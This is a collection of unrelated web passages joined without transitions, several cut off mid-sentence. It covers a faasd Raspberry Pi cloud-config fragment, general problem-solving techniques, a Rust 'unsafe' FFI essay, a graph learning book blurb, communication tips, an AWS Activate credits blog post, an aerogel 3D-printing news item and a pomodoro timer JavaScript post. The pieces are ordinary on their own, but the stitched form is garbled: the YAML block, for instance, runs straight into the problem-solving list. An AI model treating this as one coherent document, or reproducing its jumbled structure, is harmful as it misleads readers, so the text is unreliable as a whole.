<li>edit user-data (OpenFaas credentials, inlets token, …)</li>
<li>boot Raspberry Pi</li>
</ul>
<div><pre><code data-lang="yaml"><span>#cloud-config</span>

<span># Set your hostname here, the manage_etc_hosts will update the hosts file entries as well</span>
hostname: faasd
manage_etc_hosts: <span>true</span>

<span># Add an authorized ssh key</span>

<p>A lot of people don’t realize that there are general purpose problem solving techniques that cut across domains. They can help you deal with thorny challenges in work, your personal life, startups, or even if you’re trying to prove a new theorem in math.</p>



<p>Below are the 26 general purpose problem solving techniques that I like best, along with a one-word name I picked for each, and hypothetical examples to illustrate what sort of strategy I’m referring to.</p>



<p>Consider opening up this list whenever you’re stuck solving a challenging problem. It’s likely that one or more of these techniques can help!</p>



<h4>General Purpose Techniques for Solving Challenging Problems of All Kinds</h4>



<p>1. <strong>Clarifying</strong> – try to define the problem you are facing as precisely as you can, maybe by writing down a detailed description of exactly what the problem is and what constraints exist for a solution, or by describing it in detail to another person, which may lead to you realizing the problem is not quite what you had thought, or that it has a more obvious solution than you thought.</p>



<p>Life Example: <em>“I thought that I needed to find a new job, but when I thought really carefully about what I don’t like about my current job, I realized that I could likely fix those things by talking to my boss or even, potentially, just by thinking about them differently.”</em></p>



<p>Startup Example: <em>“we thought we had a problem with users not wanting to sign up for the product, but when we carefully investigated what the problem really was, we discovered it was actually more of a problem of users wanting the product but then growing frustrated because of bad interface design.”</em></p>



<p>2. <strong>Subdividing</strong> – break the problem down into smaller problems in such a way that if you solve each of the small problems, you will have solved the entire problem.</p>



<p>Startup Example:<em> “My goal is to get company Z to become a partner with my company, and that seems hard, so let me break that goal into the steps of (a) listing the ways that company Z would benefit from becoming a partner with us, (b) finding an employee at company Z who would be responsive to hearing about these benefits, and (c) tracking down someone who can introduce me to that employee.”</em></p>



<p>Math Example:<em> “I want to prove that a certain property applies to all functions of a specific type, so I start by (a) showing that every function of that type can be written as a sum of a more specific type of function, then I show that (b) the property applies to each function of the more specific type, and finally I show that (c) if the property applies to each function in a set of functions then it applies to arbitrary sums of those functions as well.”</em></p>



<p>3. <strong>Simplifying </strong>– think of the simplest variation of the problem that you expect you can solve that shares important features in common with your problem, and see if solving this simpler problem gives you ideas for how to solve the more difficult version.</p>



<p>Startup Example: <em>“I don’t know how to hire a CTO, but I do know how to hire a software engineer because I’ve done it many times, and good CTOs will often themselves be good software engineers, so how can I tweak my software engineer hiring to make it appropriate for hiring a CTO?”</em></p>



<p>Math Example: <em>“I don’t know how to calculate this integral as it is, but if I remove one of the free parameters, I actually do know how to calculate it, and maybe doing that calculation will give me insight into the solution of the more complex integral.”</em></p>



<p>4. <strong>Crowd-sourcing</strong> – use suggestions from multiple people to gain insight into how to solve the problem, for instance by posting on Facebook or Twitter requesting people’s help, or by posting to a Q&amp;A site like Quora, or by sending emails to 10 people you know explaining the problem and requesting assistance.</p>



<p>Business Example: <em>“Do you have experience outsourcing manufacturing to China? If so, I’d appreciate hearing your thoughts about how to approach choosing a vendor.”</em></p>



<p>Health Example: <em>“I have trouble getting myself to stick to doing exercise daily. If you also used to have trouble getting yourself to exercise but don’t anymore, I’d love to know what worked to make it easier for you.”</em></p>



<p>5. <strong>Splintering</strong> – if the problem you are trying to solve has special cases that a solution to the general problem would also apply to, consider just one or two of these special cases as examples and solve the problem just for those cases first. Then see if a solution to one of those special cases helps you solve the problem in general.</p>



<p>Startup Example: <em>“I want to figure out how to improve employee retention in general, let me examine how I could have improved retention in the case of the last three people that quit.”</em></p>



<p>Startup Example: <em>“I want to figure out how to convince a large number of people to become customers, let me first figure out how to convince just Bill and John to become customers since they seem like the sort of customer I want to attract, and see what general lessons I learn from doing that.”</em></p>



<p>6. <strong>Reading</strong> – read the books or textbooks that seems most related to the topic, and see whether they provide a solution to the problem, or teach you enough related information that you can now solve it yourself. </p>



<p>Economics Example: <em>“Economists probably have already figured out reasonable ways to estimate demand elasticity, let’s see what an econometrics textbook says rather than trying to invent a technique from scratch.”</em></p>



<p>Mental Health Example: <em>“I’ve been feeling depressed for a long time, maybe I should read some well-liked books about depression, such as ‘Feeling Good.'”</em></p>



<p>7. <strong>Searching </strong>– think of a similar problem that you think practitioners, bloggers or academics might have already solved and search online (e.g., via google, Q&amp;A sites, or google scholar academic paper search) to see if anyone has done a write-up about how they solved it.</p>



<p>Advertising Example: <em>“I’m having trouble figuring out the right advertising keywords to bid on for my specific product, I bet someone has a blog post describing how to approach choosing keywords for other related products.”</em></p>



<p>Machine Learning Example:<em> “I can’t get this neural network to train properly in my specific case, I wonder if someone has written a tutorial about how to apply neural networks to related problems.”</em></p>



<p>8. <strong>Unconstraining</strong> – list all the constraints of the problem, then temporarily ignore one or more of the constraints that make the problem especially hard, and try to solve it without those constraints. If you can, then see if you can modify that unconstrained solution until it becomes a solution for the fully constrained problem.</p>



<p>Startup Example: <em>“I need to hire someone who can do work at the intersection of machine learning and cryptography, let me drop the constraint of having cryptography experience and recruit machine learning people, then pick from among them a person that seems both generally capable and well positioned to learn the necessary cryptography.”</em></p>



<p>Computer Science Example: <em>“I need to implement a certain algorithm, and it needs to be efficient, but that seems very difficult, so let me first figure out how to implement an inefficient version of the algorithm (i.e., drop the efficiency constraint), then at the end I will try to figure out how to optimize that algorithm for efficiency.”</em></p>



<p>9. <strong>Distracting</strong> – fill your mind with everything you know about the problem, including facts, constraints, challenges, considerations, etc. and then stop thinking about the problem, and go and do a relaxing activity that requires little focus, such as walking, swimming, cooking, napping or taking a bath to see if new ideas or potential solutions pop into your mind unexpectedly as your subconscious continues to work on the problem without your attention.</p>



<p>Example: <em>“For three days, I’ve been trying to solve this problem at work, but the solution only came to me when I was strolling in the woods and not even thinking about it.”</em></p>



<p>Example from mathematician Henri Poincaré: <em>“The incidents of the travel made me forget my mathematical work. Having reached Coutances, we entered an omnibus to go someplace or other. At the moment when I put my foot on the step, the idea came to me, without anything in my former thoughts seeming to have paved the way for it, that the transformations I had used to define the Fuchsian functions were identical with those of non-Euclidean geometry.”</em></p>



<p>10. <strong>Reexamining</strong> – write down all the assumptions you’ve been making about the problem or about what a solution should look like (yes – make an actual list). Then start challenging them one by one to see if they are actually needed or whether some may be unnecessary or mistaken.</p>



<p>Psychology Example: <em>“We were assuming in our lab experiments that when people get angry they have some underlying reason behind it, but there may be some anger that is better modeled as a chemical fluctuation that is only loosely related to what happens in the lab, such as when people are quick to anger because they are hungry.”</em></p>



<p>Math Example: <em>“I need to construct a function that has this strange property, and so far I’ve assumed that the function must be smooth, but if it doesn’t actually need to be then perhaps I can construct just such a function out of simple linear pieces that are glued together.”</em></p>



<p>11.<strong> Reframing</strong> – try to see the problem differently. For instance, by flipping the default, analyzing the inverse of the problem instead, thinking about how you would achieve the opposite of what you want, or shifting to an opposing perspective.</p>



<p>Startup Example: <em>“If we were building this company over again completely from scratch, what would we do differently in the design of our product, and can we pivot the product in that direction right now?”</em></p>



<p>Life Example: <em>“Should move to New York to take a job that pays $20,000 more per year? Well, if I already lived in New York, the decision to stay there rather than taking a $20,000 pay cut to move here would be an easy one. …</em></p></div></div>

	<p>August 22, 2020</p>
</header>

<p>Google has published a document on <a href="https://www.chromium.org/Home/chromium-security/memory-safety/rust-and-c-interoperability">Rust and C++ interoperability</a> in the context of Chromium. It describes their criteria for the experience of calling C++ from Rust — minimal use of <code><span>unsafe</span></code>, no boilerplate beyond existing C++ declarations, and broad support for existing Chromium types.</p>

<p>The response to this document has included a lot of confusion and misinformation. Really, this is a continuation of a larger ongoing discussion of how to use <code><span>unsafe</span></code> properly. Rust FFI and <code><span>unsafe</span></code> are complicated and often subtle topics, so here I am going to attempt to summarize the issues and suggest how we might address them.</p>

<h3 id="what-is-unsafe-exactly">What is <code><span>unsafe</span></code>, exactly?</h3>

<p><a href="https://www.rust-lang.org/">Rust</a>’s core value proposition is to “guarantee memory-safety and thread-safety — enabling you to eliminate many classes of bugs at compile time,” without sacrificing the ability to target the same use cases as C++ (namely: performance-critical, embedded, and/or integrated with other languages).</p>

<p>This memory and thread-safety (henceforth just “safety”) is normally enforced automatically by the compiler. However, Rust includes several features that are <em>not</em> checked in this way, including raw pointers, global mutable state, untagged unions, and (notably) the ability to call functions written in other languages. These features can only be used within an <code><span>unsafe</span></code> block:</p>

<div><div><pre><code><span>// This function accepts a raw pointer, which may be null, misaligned, dangling, etc.</span>
<span>fn</span> <span>read</span><span>(</span><span>address</span><span>:</span> <span>*</span><span>const</span> <span>i32</span><span>)</span> <span>{</span>
    <span>// The compiler rejects this:</span>
    <span>let</span> <span>data</span> <span>=</span> <span>*</span><span>address</span><span>;</span>

    <span>// The compiler accepts this:</span>
    <span>unsafe</span> <span>{</span> <span>let</span> <span>data</span> <span>=</span> <span>*</span><span>address</span><span>;</span> <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Rust provides these operations with the intent that they will be used <em>only</em> as building blocks for safe APIs. In other words, while the compiler does not enforce them, there <em>are</em> a set of rules governing the safe use of these operations.</p>

<p>Thus, an <code><span>unsafe</span></code> block is more than a mere warning that “this program might crash or corrupt the heap.” It is a marker that the program author has checked that they are following those rules! This is why <code><span>unsafe</span></code> is not “viral,” and we can still have safe Rust programs even with <code><span>unsafe</span></code> in the standard library:</p>

<p><strong>The most important part of an <code><span>unsafe</span></code> block is the surrounding context that ensures its contents will never break those rules, no matter how it is used.</strong> (The question of <a href="https://www.ralfj.de/blog/2016/01/09/the-scope-of-unsafe.html">“how much context?”</a> is an interesting one. It’s a bit of a tangent to this post, but the answer is generally based on module privacy.)</p>

<h3 id="how-can-calling-c-ever-be-safe">How can calling C++ ever be safe?</h3>

<p>When a Rust program calls a foreign function (that is, one written in another language like C++), there are several ways things can go wrong, breaking Rust’s memory and thread-safety promise. We can split them into two failure modes, which the surrounding context will need to prevent:</p>

<ul>
  <li>
    <p>Each foreign function’s type signature must be declared in the calling Rust program, because the compiler doesn’t read any external formats like C++ header files.</p>

    <p>This means the signature may not match the actual function, in which case the compiler produces garbage, and the call will probably corrupt the stack or similar.</p>
  </li>
  <li>
    <p>Each foreign function must be called following certain rules (e.g. “only call this once,” “only call this from one thread at a time,” “don’t pass a null pointer,” “this array argument must have at least N elements”).</p>

    <p>This means arguments or program state may not be valid, in which case the foreign function itself will probably do something to violate memory or thread-safety.</p>
  </li>
</ul>

<p>Writing matching type signatures by hand can be quite mechanical, tedious, and error-prone. When those signatures are simple enough, tools like <a href="https://github.com/rust-lang/rust-bindgen"><code><span>bindgen</span></code></a> can instead automatically generate them from C or C++ headers. This eliminates a whole class of bugs!</p>

<p>However, C++ type signatures encode more information than <code><span>bindgen</span></code> understands, including <em>ownership</em> information — who is responsible for freeing the object, and when and how should they do so? The <a href="https://github.com/dtolnay/cxx/"><code><span>cxx</span></code></a> binding generator understands several standard C++ “vocabulary” types like <code><span>std</span><span>::</span><span>vector</span></code> and <code><span>std</span><span>::</span><span>unique_ptr</span></code>, expanding the class of bugs we can eliminate.</p>

<p>The caller of a foreign function may not need to worry about the first failure mode, if they can use a tool like <code><span>bindgen</span></code> or <code><span>cxx</span></code>, but the second failure mode is more fundamental. They must inspect the foreign function and its documentation, and then add static or dynamic checks that ensure safe Rust programs can’t violate that function’s safety rules.</p>

<p>At this point, <strong>we can be sure that the Rust program is safe by inspecting these three things:</strong></p>

<ul>
  <li>The foreign function: it must actually be safe to call when following the rules enforced on the Rust side.</li>
  <li>The Rust call site: it must actually enforce the rules required by the foreign function.</li>
  <li>The binding generator tool: it must correctly translate the foreign language’s type signatures to Rust.</li>
</ul>

<p>The whole <em>rest</em> of the Rust program no longer matters at all, because it’s already checked by the Rust compiler.</p>

<h3 id="so-whats-the-problem">So what’s the problem?</h3>

<p>After <code><span>cxx</span></code>’s announcement, it immediately received an issue titled <a href="https://github.com/dtolnay/cxx/issues/1">“Calling from Rust to C++ is not safe”</a>, which cut directly to the core of this discussion: <code><span>cxx</span></code> generates wrapper functions that make the <code><span>unsafe</span></code> foreign function calls for you, so a Rust program can call C++ without the literal text <code><span>unsafe</span></code> anywhere in its source code.</p>

<p>It’s important to approach this with the realization that this particular aspect of <code><span>cxx</span></code> was <em>not</em> a new development. From the start, the Rust ecosystem has relied on macros and build scripts that generate <code><span>unsafe</span></code> blocks. Some of these macros are always safe to use, containing the blocks’ entire “safety context,” while others expect their users to do some extra safety checking on their own.</p>

<p>When a Rust function requires its callers to do some extra safety checking, you can add the <code><span>unsafe</span></code> keyword to its declaration, which makes it into a new unsafe operation that can only be invoked from another <code><span>unsafe</span></code> block:</p>

<div><div><pre><code><span>// This function can only be called from an `unsafe` block:</span>
<span>unsafe</span> <span>fn</span> <span>read</span><span>(</span><span>address</span><span>:</span> <span>*</span><span>const</span> <span>i32</span><span>)</span> <span>{</span> <span>..</span> <span>}</span>

<span>fn</span> <span>caller</span><span>()</span> <span>{</span>
    <span>let</span> <span>x</span> <span>=</span> <span>5</span><span>;</span>

    <span>// This is only okay if `&amp;x` is valid for whatever `read` does with `address`:</span>
    <span>unsafe</span> <span>{</span> <span>read</span><span>(</span><span>&amp;</span><span>x</span><span>);</span> <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In a sense, <code><span>unsafe</span></code> functions like this are the <em>exact opposite</em> of <code><span>unsafe</span></code> blocks. An <code><span>unsafe</span></code> <em>block</em> says “I’ve ensured that these operations are always safe.” An <code><span>unsafe</span></code> <em>function</em> says “The caller is responsible for ensuring this operation is always safe.” Ideally, both should carry comments justifying their correctness — on blocks, pointing out the safety checks; on functions, describing the rules the caller must follow.</p>

<p>However, code generation happens before and outside of this whole system! There’s no way to mark a macro or build script as an <code><span>unsafe</span></code> operation. This is the real question here: <strong>Where do we put the comments justifying that generated, safe wrapper functions enforce the foreign functions’ safety rules, and how would an audit know to look for them?</strong></p>

<h3 id="what-are-our-options">What are our options?</h3>

<p>I begin with a couple of obligatory non-options:</p>

<blockquote>
  <p>Why don’t you want <code><span>unsafe</span></code> blocks at all your FFI call sites? Isn’t the whole point of Rust to be safe by default, and mark all the exceptions to make debugging easier?</p>
</blockquote>

<p>This is deeply unsatisfying, and flies in the face of Rust’s usual approach to language design: “eat your cake and have it too!” We should be able to isolate most FFI-related unsafety to the FFI layer. To quote Google’s first requirement: “[<code><span>unsafe</span></code>] should be restricted to patches of genuinely unsafe Rust code, and for C++ interoperability code where there’s shared ownership or other complexities.”</p>

<p>There’s also the inverse, though I see it as a straw man more than a real argument:</p>

<blockquote>
  <p>Our APIs are already pretty easy to use correctly, let’s just mark them safe and move on.</p>
</blockquote>

<p>This is also deeply unsatsifying. Even in C++, we should be aware of our APIs’ rules and the ways people might accidentally break them. Preventing those mistakes is the <em>true</em> point of Rust’s safety, so if you would rather debug recurring memory corruption than translate those rules to Rust, either the API needs improvement or Rust is failing.</p>

<p>A couple of more realistic options:</p>

<h4 id="hand-written-wrappers">Hand-written wrappers</h4>

<p>You might take the time-honored approach of a typical “idiomatic Rust FFI wrapper” crate: use a binding generator however you like, but don’t make its output public. Instead, hand-write the crate’s public API from scratch.</p>

<p>This often works well! Plenty of libraries are small enough, the <a href="https://doc.rust-lang.org/cargo/reference/build-scripts.html#-sys-packages"><code><span>-</span><span>sys</span></code> crate convention</a> lets people work around the idiomatic wrapper if necessary, and there is an obvious place to deal with extra rules from foreign code. However, this duplication of API design is not always scalable.</p>

<p>It may also be the case that the foreign API is not conducive to being safely wrapped. Here it may be better to leave the bindings as <code><span>unsafe</span></code>, and build a safe API at a higher, and more application-specific, level.</p>

<h4 id="at-last-generated-wrappers">At last, generated wrappers</h4>

<p>You might instead come up with a convention for “<code><span>unsafe</span></code> macros.” Put “unsafe” in their name, or require users to pass the <code><span>unsafe</span></code> at an appropriate position in the macro’s input. <a href="https://news.ycombinator.com/item?id=24244121">This is likely to show up in <code><span>cxx</span></code></a> at some point.</p>

<p>This way you can still “grep for <code><span>unsafe</span></code>” and find the binding generator invocation, like we wanted. It amounts to asserting that all the foreign functions you’re binding to have no extra safety rules, which (believe it or not) <em>is</em> sometimes the case.</p>

<p>You might further tweak the binding generator to let you mark individual wrappers as <code><span>unsafe</span></code>, as an opt-out for those cases “where,” as Google puts it, “there’s shared ownership or other complexities.”</p>

<p>Another approach comes from Microsoft, in the <a href="https://github.com/microsoft/winrt-rs"><code><span>winrt</span><span>-</span><span>rs</span></code></a> crate. WinRT defines a whole new type system, designed to be easy to “project” into various languages, including C#, Javascript, C++, and now Rust. It also defines a file format to describe APIs in this type system. So long as it fits into the WinRT type system, a library written in one language can be used from any …</p></article></div>

<p>
The field of graph representation learning has grown at an incredible (and sometimes unwieldy) pace over the past seven years, transforming from a small subset of researchers working on a relatively niche topic to one of the fastest growing sub-areas of deep learning.
</p>
<p>
This book is my attempt to provide a brief but comprehensive introduction to graph representation learning, including methods for embedding graph data, graph neural networks, and deep generative models of graphs.

<p>We live in a noisy world.</p>



<p>To cut through this noise and create clarity for those around us, we all need to communicate effectively every day. Our work doesn’t speak for itself; we need to collaborate, inspire, and build relationships. To do this, we need to be able to communicate clearly.</p>



<p>As a shy child and introverted adult, externalizing my perspective never came naturally to me. It still doesn’t. In high school, I had the dubious honor of being cast in the only non-speaking role in drama class. Despite this, today, I spend the majority of my day, every day, communicating with people. In some ways, my day job&nbsp;<em>is</em>&nbsp;communication.</p>



<p>Communication is a learned skill. I’m certainly no Obama, but over time, I’ve collected a set of tools that have helped me communicate more effectively.</p>



<h3>Contents</h3>



<ol><li><a href="#rule-of-three">Rule of Three</a></li><li><a href="#answer-explain-example">Answer, Explain, Example</a></li><li><a href="#structure-say-summarize">Structure, Say, Summarize</a></li><li><a href="#feelings-last">Feelings Last Longer Than Words</a></li><li><a href="#pause-context">Pause and Give Context</a></li><li><a href="#so-what">“So What” Is Your One Key Takeaway</a></li></ol>



<h3 id="rule-of-three">Rule of Three</h3>



<p>Three is a magic number in communication. From stories, like The Three Musketeers, Three Blind Mice, and Three Little Pigs, to colloquialisms like “blood, sweat, and tears,” <em>three</em> is everywhere. There’s even a Latin phrase, omne trium perfectum, or <em>everything that comes in threes is perfect</em>.</p>



<p>Why is this? Humans beings seek both patterns and simplicity. We’re pattern-recognition machines, always looking for signals among the noise. Simultaneously, we have limited working memory. We can’t remember a list of fifteen things or even a list of five. But we can remember three, which is the minimum number of objects needed to make a pattern. Three is concise, persuasive, and memorable.</p>



<p>When you say, “there are three reasons we should do this,” people pay attention. They know that three is easy to digest and remember. And you, the speaker, are forced to structure your argument succinctly and compellingly. When you put seven bullet-points in a document or slide, people’s eyes glaze over. When you put a concise list of three, they digest it. Within reason, in verbal or written communication, distill what you have to say down to three.</p>



<h3 id="answer-explain-example">Answer, Explain, Example</h3>



<p>I heard this from a former LinkedIn executive. The premise is simple but powerful. When answering a question, give the answer, then elaborate, then provide an example. That’s it.</p>



<p>By answering the question immediately, you’re getting to the point and giving the person who asked a concise answer. Then you’re supporting it with your rationale. Finally, you’re backing it up with a real example.</p>



<h3 id="structure-say-summarize">Structure, Say, Summarize</h3>



<p>“Structure, Say, Summarize” is a tool I use when communicating something nuanced. The basis is this: First, structure how you’re going to make the statement. Second, make the statement. Third, summarize your position and the “<a href="#so-what">so what</a>.”</p>



<ul><li>Structure: It’s a risk, but there are three reasons we should do this.</li><li>Say: The first reason is X, the second is Y, the third reason is Z.</li><li>Summarize: I know nothing is guaranteed. But, given these reasons, we’re missing an opportunity to grow by not doing this.</li></ul>



<p>This structure is akin to a Dale Carnegie quote: “Tell the audience what you’re going to say, say it; then tell them what you’ve said.”</p>



<p>Verbal communication is messy, and it’s difficult for people to follow spoken paragraphs. Even when you don’t have a tidy list of three, starting with “there are a few reasons,” making stating a few points, then summarizing your view is a powerful way to communicate more clearly.</p>



<p>But don’t use this all the time, or you’ll seem like a robot.</p>



<h3 id="feelings-last">Feelings Last Longer Than Words</h3>



<p>People will often forget what you said, but they’ll never forget how you made them feel. You might have made a logically sound argument, but if the recipient didn’t feel enthused, inspired, or understood, it probably won’t stick.</p>



<p>Feelings are why the world’s most iconic brands are so effective. We don’t remember every detail, every line of copy, or every number. But they make us feel a certain way, and feelings are sticky.</p>



<p>If you want to inspire action or lead a team, logic is important, but so is ensuring people are inspired when they walk away from an interaction. People won’t remember everything you said, but they’ll remember how you made them feel.</p>



<h3 id="pause-context">Pause and Give Context</h3>



<p>Never assume that everyone has the same context that you do. There’s a magical and straightforward sequence of words for this: “Let me give some context to make sure we’re on the same page.”</p>



<p>In any given conversation, everyone has a perspective formulated from a different set of inputs. The more closely aligned you can get these inputs, the more effective your communication will be. Shared context helps avoid “talking past each other” situations.</p>



<p>One of the tenets of effective communication is <em>over-communication</em>. Most people associate this with being annoying or spam. In my experience, that isn’t true. Over-communication is about never assuming that people have the same context that you do.</p>



<h3 id="so-what">“So What” Is Your One Key Takeaway</h3>



<p>For every piece of communication that you create, find the “so what.” Whether a presentation, document, or slide,&nbsp;if someone asked, “so what?”, what would you say? </p>



<p>Whatever the answer to that question is, make sure it comes across clearly. The answer to “so what?” usually involves articulates the implication for the audience.</p>



<p>An easily applicable tip here is to title your slides or headers with the “so what” for that particular slide or section. Hone in on the most important takeaway and the implication for the audience — why should they care?</p>

<![CDATA[AWS Activate and Our $4k Mistake]]>

August 22, 2020 | https://formcake.com/blog/aws-activate-and-our-four-thousand-dollar-mistake | <a href="https://web.archive.org/web/*/https://formcake.com/blog/aws-activate-and-our-four-thousand-dollar-mistake">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Recently we signed up for the <a href="https://aws.amazon.com/activate/">AWS Activate</a> program, which provides startups / small internet businesses like us with a variety of benefits - from AWS credits to free business-tier support.</p>
<p>We signed up for AWS Activate as part of our application to the Stripe Atlas program, which we're <a href="https://formcake.com/our-experience-with-stripe-atlas">big fans</a> of, but you don't need to be a part of Stripe Atlas to sign up for Activate.</p>
<p>When signing up for Activate though you <em>do</em> need to know you'll be faced with a question that can drastically shape the number of credits you ultimately receive.</p>
<h2 id="the-mistake">The Mistake</h2>
<p>When we first went through the process we very simply answered that question wrong. We encountered the following screen, outlining the different sign up paths for bootstrapped vs funded startups.</p>
<p><img src="https://formcake.com/images/aws-activate-screen.png" alt="AWS Activate bootstrapped vs funded startups"></p>
<p>When we first signed up, we did so as a bootstrapped startup: We're not accepting any funding, or even incorporating as a C Corp so we can have shares and an officer structure. We're incorporated as an LLC because we want to slowly build our way to profitability, so "bootstrapped" as a term seemed to described us.</p>
<p>We received $1,000 in AWS credits and were happy, but <a href="https://formcake.com/stripe-atlas-includes-five-thousand-credits-this-is-what-we-got">raised the issue with Stripe</a> that we were curious if there was a chance at getting the $5,000 that the Stripe copy seemed to suggest.</p>
<p>Stripe not only got back to us but fought for us to <a href="https://formcake.com/how-an-email-got-us-five-thousand-aws-credits">receive the full $5,000 in credits from AWS</a>.</p>
<p>But in their email it became clear what the issue was: <strong>We signed up under the wrong option</strong>.</p>
<p>Even though we're not accepting proper funding rounds, we are "sponsored" by Stripe in a sense through the Atlas program. That means we have an organization code/ID we can plug into the AWS Activate signup process signifying that we're a "funded" startup.</p>
<p>Doing so appears to net you a cool $5,000 in AWS credits.</p>
<p>Luckily we pestered Stripe to the point where we were able to receive not just the extra money ($5,000) but also keep the original, $1,000 amount. Since we're a small startup that's on an all-AWS infrastructure, this money was pretty critical to us, and provides a nice runway.</p>
<h2 id="the-takeaway">The Takeaway</h2>
<p>If you're signing up for the AWS Activate program, consider looking for a program like Stripe Atlas to sign up with. If you're able to find this kind of sponsorship and sign up with your corresponding organization ID, you can probably expect more credits. Don't be like us and potentially leave this much money (well, credits) on the table.</p>
<p>If you're anything like us, that difference between $1,000 and $5,000 is something you can feel!</p>

Silica aerogels are light, porous foams that provide excellent thermal insulation.&nbsp;</p><p>In practice, they are also known for their brittle behaviour, which is why they are usually reinforced with fibres or with organic or biopolymers for large-scale applications. Due to their brittle fracture behaviour, it is also not possible to saw or mill small pieces out of a larger aerogel block. Directly solidifying the gel in miniaturised moulds is also not reliably - which results in high scrap rates. This is why aerogels have hardly been usable for small-scale applications.</p><h2><b>Stable, well-formed microstructures</b></h2><p>The Empa team led by Shanyu Zhao, Gilberto Siqueira, Wim Malfait and Matthias Koebel have now succeeded in producing stable, well-shaped microstructures from silica aerogel by using a 3D printer. The printed structures can be as thin as a tenth of a millimeter. The thermal conductivity of the silica aerogel is just under 16 mW/(m*K) - only half that of polystyrene and even significantly less than that of a non-moving layer of air, 26 mW/(m*K). At the same time, the novel printed silica aerogel has even better mechanical properties and can even be drilled and milled. This opens up completely new possibilities for the post-processing of 3D printed aerogel mouldings.</p><p>With the method, for which a patent application has now been filed, it is possible to precisely adjust the flow and solidification properties of the silica ink from which the aerogel is later produced, so that both self-supporting structures and wafer-thin membranes can be printed. As an example of overhanging structures, the researchers printed leaves and blossoms of a lotus flower. The test object floats on the water surface due to the hydrophobic properties and low density of the silica aerogel - just like its natural model. The new technology also makes it possible for the first time to print complex 3D multi-material microstructures.</p><h2><b>Insulation materials for microtechnology and medicine</b></h2><p>With such structures it is now comparatively trivial to thermally insulate even the smallest electronic components from each other. The researchers were able to demonstrate the thermal shielding of a temperature-sensitive component and the thermal management of a local “hot spot” in an impressive way. Another possible application is the shielding of heat sources inside medical implants, which should not exceed a surface temperature of 37 degrees in order to protect body tissue.</p><h2><b>A functional aerogel membrane</b></h2><p>3D printing allows multilayer/multi-material combinations to be produced much more reliably and reproducibly. Novel aerogel fine structures become feasible and open up new technical solutions, as a second application example shows: Using a printed aerogel membrane, the researchers constructed a “thermos-molecular” gas pump. This permeation pump manages without any moving parts at all and is also known to the technical community as a Knudsen pump, named after the Danish physicist Martin Knudsen. The principle of operation is based on the restricted gas transport in a network of nanoscale pores or one-dimensional channels of which the walls are hot at one end and cold at the other. The team built such a pump from aerogel, which was doped on one side with black manganese oxide nanoparticles. When this pump is placed under a light source, it becomes warm on the dark side and starts to pump gases or solvent vapours.</p><h2><b>Air purification without moving parts</b></h2><p>These applications show the possibilities of 3D printing in an impressive way: 3D printing turns the high-performance material aerogel into a construction material for functional membranes that can be quickly modified to suit a wide range of applications. The Knudsen pump, which is driven solely by sunlight, can do more than just pump: If the air is contaminated with a pollutant or an environmental toxin such as the solvent toluene, the air can circulate through the membrane several times and the pollutant is chemically broken down by a reaction catalyzed by the manganese oxide nanoparticles. Such sun-powered, autocatalytic solutions are particularly appealing in the field of air analysis and purification on a very small scale because of their simplicity and durability.</p><p>Empa researchers are now looking for industrial partners who want to integrate 3D-printed aerogel structures into new high-tech applications.</p><p>–</p><p><i>Header image:&nbsp;To demonstrate that fine aerogel structures can be produced in 3D printing, the researchers printed a lotus flower made of aerogel.

    <hr>
    <p>
      For the last month or so I had been working on what was pretty much just a
      pomodoro timer app in React. The workflow of the app would be as such:
    </p>
    <ol>
      <li>
        <p>
          The users go in and create their tasks for the day defining the title
          and how many pomodoros there would be for each task.
        </p>
      </li>
      <li>
        <p>
          The users would pick which task they would do next, immediatly
          starting the timer.
        </p>
      </li>
      <li>
        <p>
          After 25 minutes, the timer would ring, starting a 5 minute break
          after which the user would either go to the next 25 minute timer if
          the task has more than 1 pomodoro of duration or complete the task and
          clear the completed task.
        </p>
      </li>
      <li>
        <p>
          If the user completes their task before the timer ends, they can skip
          the 25 minutes and go directly to a 5 minute break or they can also
          skip that break and go back to step 1
        </p>
      </li>
    </ol>
    <h2 id="why-">Why?</h2>
    <p>
      Why would you want to waste your time remaking a project idea already made
      by thousands of people? Well, all of the pomodoro timers out there will
      have at least one of the following issues, upon which I wanted to improve:
    </p>
    <ol>
      <li>Not great UX</li>
      <li>Distracting/dated UI</li>
      <li>Flawed timer logic</li>
    </ol>
    <p>
      It's easy to understand what I mean by saying bad UX and UI, but what
      do I mean about the flawed timer logic?
    </p>
    <h2 id="the-flaw">The flaw</h2>
    <p>
      If you're a curious person you might have the urge to try and break
      software to see if the creators behind apps tested for all edge cases. I
      like to think that the best programmers try to make their apps so that
      even if the user tries to make the app not work, it will.
    </p>
    <p>
      On almost all pomodoro timers available online you'll see this
      particular behaviour where if you spam click the pause/resume button, time
      won't pass. Even those milliseconds between each click aren't
      being accounted by the timer. But why is that? In order to understand this
      flaw, it's necessary to know how you would code a timer.
    </p>
    <p>
      Basically, a timer is composed of some piece of code that periodically
      subtracts from some variable the amount of time passed since the last
      update. This <code>timeleft</code> variable is displayed and then repeats
      the update cycle.
    </p>
    <p>This would translate to something like this in Javascript:</p>
    <pre><code><span>let</span> <span>timeleft</span> = <span>5000</span>;
    <span>let</span> <span>interval</span> = setInterval(() =&gt; {
      <span>if</span> (timeleft &gt; <span>0</span>) {
        timeleft <span>-=</span> <span>1000</span>;
      }
    }, <span>1000</span>);
    </code></pre>
    <p>
      The problem with almost all timer apps and components available is that
      they choose to make the interval between each code execution in
      <strong>exactly</strong> the same order of magnitude they will display on
      the lowest time measure. What I mean by this is that if they're just
      going to show how many minutes and seconds are left, they will create some
      code that updates the timer every 1 second. The problem with that is that
      every time I click pause and then resume, the time until my
      <code>timeleft</code> updates gets set to 1 second from now. So if I keep
      clicking that button on time intervals lower than the 1 second
      <code>timleft</code> update, my timer will just freeze unless I wait more
      than 1 second to click the pause button again.
    </p>
    <p>
      It's an easy fix. All you've got to do is decrease the intervals
      in which <code>timeleft</code> decreases while also decreasing how much
      you subtract from it.
    </p>
    <p>Updating the code I showed you before, it would look like this:</p>
    <pre><code><span>let</span> <span>timeleft</span> = <span>5000</span>;
    <span>let</span> <span>interval</span> = setInterval(() =&gt; {
      <span>if</span> (timeleft &gt; <span>0</span>) {
        timeleft <span>-=</span> <span>100</span>;
      }
    }, <span>100</span>);
    </code></pre>
    <p>
      This technically solves our problem. If it ended here, I would be a happy
      man, but there is a huge issue with the code above that isn't possible
      to be detected without some extra knowledge and especially not fixable
      without some thinking.
    </p>
